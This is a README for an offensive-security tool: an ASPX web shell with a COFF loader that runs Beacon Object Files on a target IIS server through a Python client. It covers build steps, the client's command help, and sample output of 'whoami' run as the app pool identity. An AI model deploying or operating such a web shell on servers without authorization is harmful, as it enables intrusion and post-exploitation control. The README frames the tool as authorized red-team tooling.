# ASPX Web Shell with COFF Loader

Based on TrustedSec's [CS_COFFLoader](https://github.com/trustedsec/CS_COFFLoader)

## Description

This ASPX web shell enables execution of **Beacon Object Files (BOFs)** on a target server using a semi-interactive Python client.

It leverages a COFF loader implementation derived from TrustedSec’s `CS_COFFLoader`.

This project is intended **strictly for security research and authorized penetration testing**. By using this project, you agree to comply with all applicable laws and regulations.

## Prerequisites

Prior to using you will need to:

1. Compile `beacon_compatibility.c` from https://github.com/trustedsec/CS_COFFLoader/tree/main/beacon_object, and substitute the `{{BEACON_DATA}}` placeholder in the ASPX file with the Base64-encoded object file.

2. Compile you BOFs, for example, from https://github.com/trustedsec/CS-Situational-Awareness-BOF, and specify the path to the directory with the compiled BOFs in the web client.

## Usage
```
python3 webshell_bof_client.py http://1.2.3.4/bof.aspx
[*] ASPX Web Shell With COFF Loader Client
[*] Target: http://1.2.3.4/bof.aspx
[*] Beacons: /usr/share/beacons
[*] Type 'help' for available commands.

bof> help

Client for ASPX Web Shell with COFF Loader
Based on TrustedSec's COFFLoader: https://github.com/trustedsec/COFFLoader/tree/main
Author: Eugenie Potseluevskaya
    
For security research and authorized penetration testing only.
Use strictly on systems you own or have explicit written permission to test.
Unauthorized use is illegal and the author assumes no liability for misuse or damages resulting from this code.
    
Available commands:
  help
      Show this message.

  list
      List available beacons in the beacons directory.

  exec <beacon_name> [format_string [arg1 arg2 ...]]
      Execute a beacon against the server.

      beacon_name   Name of the beacon subdirectory.
      format_string bof_pack format string (b/i/s/z/Z). Omit if no args needed.
      arg1 arg2 ... Arguments matching the format string.

      Examples:
        exec whoami
        exec mybeacon z "hello world"
        exec mybeacon zi "some string" 42
        exec mybeacon zZ "str1" "widestr"

  exit
      Quit the client.

bof> exec whoami
[*] Sending 'whoami' (x64) to http://1.2.3.4/bof.aspx ...

── Output ──────────────────────────────────────

UserName		SID
====================== ====================================
IIS APPPOOL\DefaultAppPool	S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415

....
```
